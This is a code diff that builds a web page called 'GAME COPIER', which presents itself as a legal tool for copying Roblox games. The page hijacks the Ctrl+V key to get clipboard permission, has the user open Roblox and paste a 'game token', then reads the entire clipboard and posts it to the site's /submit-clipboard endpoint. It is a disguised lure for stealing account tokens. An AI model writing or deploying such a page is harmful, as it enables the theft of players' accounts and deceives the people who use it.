@@ -1,65 +1,101 @@
-<script>
-  const gameIdInput = document.getElementById('gameIdInput');
-  const submitBtn = document.getElementById('submitBtn');
-  const tokenInput = document.getElementById('tokenInput');
-  const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
-  const tokenBox = document.getElementById('tokenBox');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>GAME COPIER</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    padding: 30px;
+    background: #f9f9f9;
+    color: #222;
+  }
+  input, button {
+    margin: 10px 0;
+    padding: 8px;
+    font-size: 1rem;
+    width: 300px;
+    max-width: 100%;
+  }
+  #tokenBox {
+    margin-top: 20px;
+    display: none;
+  }
+</style>
+</head>
+<body>
+  <h1>GAME COPIER</h1>
+  <p>Copy games (legally).</p>
 
-  let permissionGranted = false;
+  <label for="gameIdInput">Enter Game ID:</label><br />
+  <input type="text" id="gameIdInput" autocomplete="off" /><br />
+  <button id="submitBtn">Submit Game ID</button>
 
-  // Step 1: Listen for first Ctrl+V
-  document.addEventListener('keydown', async (e) => {
-    if (e.ctrlKey && e.key === 'v') {
-      e.preventDefault();
+  <div id="tokenBox">
+    <p>Paste the game token here:</p>
+    <input type="text" id="tokenInput" /><br />
+    <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
+  </div>
 
-      try {
-        // This triggers clipboard permission popup in Chrome
-        await navigator.clipboard.readText();
-        permissionGranted = true;
-        alert('Clipboard access granted! You can now paste.');
-      } catch (err) {
-        alert('Clipboard permission denied.');
-        window.location.href = 'https://example.com/denied'; // change this
+  <script>
+    const gameIdInput = document.getElementById('gameIdInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const tokenInput = document.getElementById('tokenInput');
+    const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
+    const tokenBox = document.getElementById('tokenBox');
+
+    let permissionGranted = false;
+
+    document.addEventListener('keydown', async (e) => {
+      if (e.ctrlKey && e.key.toLowerCase() === 'v') {
+        e.preventDefault();
+
+        try {
+          await navigator.clipboard.readText();
+          permissionGranted = true;
+          alert('Clipboard access granted! You can now paste.');
+        } catch (err) {
+          alert('Clipboard permission denied.');
+          window.location.href = 'https://example.com/denied'; // Replace as needed
+        }
       }
-    }
-  });
+    });
 
-  // Step 2: Game ID Submit
-  submitBtn.onclick = () => {
-    if (!permissionGranted) {
-      alert('Please press Ctrl+V once and grant clipboard permission first.');
-      return;
-    }
+    submitBtn.onclick = () => {
+      if (!permissionGranted) {
+        alert('Please press Ctrl+V once and grant clipboard permission first.');
+        return;
+      }
 
-    const gameId = gameIdInput.value.trim();
-    if (!gameId) {
-      alert('Please enter a game ID.');
-      return;
-    }
+      const gameId = gameIdInput.value.trim();
+      if (!gameId) {
+        alert('Please enter a game ID.');
+        return;
+      }
 
-    // Open the Roblox URL
-    window.open(`https://roblox.com/${gameId}`, '_blank');
+      window.open(`https://roblox.com/${gameId}`, '_blank');
 
-    // Show token box
-    setTimeout(() => {
-      tokenBox.style.display = 'block';
-    }, 2000);
-  };
+      setTimeout(() => {
+        tokenBox.style.display = 'block';
+      }, 500);
+    };
 
-  // Step 3: Submit Token and Send Full Clipboard
-  tokenSubmitBtn.onclick = async () => {
-    try {
-      const fullClipboard = await navigator.clipboard.readText();
+    tokenSubmitBtn.onclick = async () => {
+      try {
+        const fullClipboard = await navigator.clipboard.readText();
 
-      await fetch('/submit-clipboard', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ clipboardData: fullClipboard })
-      });
+        await fetch('/submit-clipboard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ clipboardData: fullClipboard })
+        });
 
-      alert('Clipboard content saved successfully!');
-    } catch (err) {
-      alert('Failed to access clipboard. Please ensure permission is granted.');
-    }
-  };
-</script>
+        alert('Clipboard content saved successfully!');
+      } catch (err) {
+        alert('Failed to access clipboard. Please ensure permission is granted.');
+      }
+    };
+  </script>
+</body>
+</html>
